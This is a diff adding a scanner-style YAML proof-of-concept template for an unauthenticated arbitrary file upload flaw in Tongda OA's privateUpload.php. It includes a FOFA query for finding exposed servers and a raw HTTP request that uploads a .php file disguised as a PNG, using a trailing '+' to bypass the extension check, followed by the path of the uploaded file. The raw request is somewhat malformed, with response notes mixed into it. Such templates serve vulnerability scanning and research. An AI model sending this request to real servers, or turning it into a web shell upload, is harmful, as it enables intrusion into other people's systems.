@@ -1,0 +1,62 @@
+id: poc-xwop5xd4rxv0gewt
+info:
+  name: 通达OA privateUpload 前台任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xwop5xd4rxv0gewt'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xwop5xd4rxv0gewt
+    fofa: app.name="通达 OA"
+http:
+- raw:
+  - 'POST /general/vmeet/privateUpload.php?fileName=dudesuite.php+ HTTP/1.1
+
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+
+    Connection: close
+
+
+
+
+    --00content0boundary00
+
+
+    Content-Disposition: form-data; name="Filedata"; filename="1.png"
+
+
+    Content-Type: image/png
+
+
+
+
+    dudesuite
+
+
+    --00content0boundary00--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    /general/vmeet/upload/temp/dudesuite.php'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
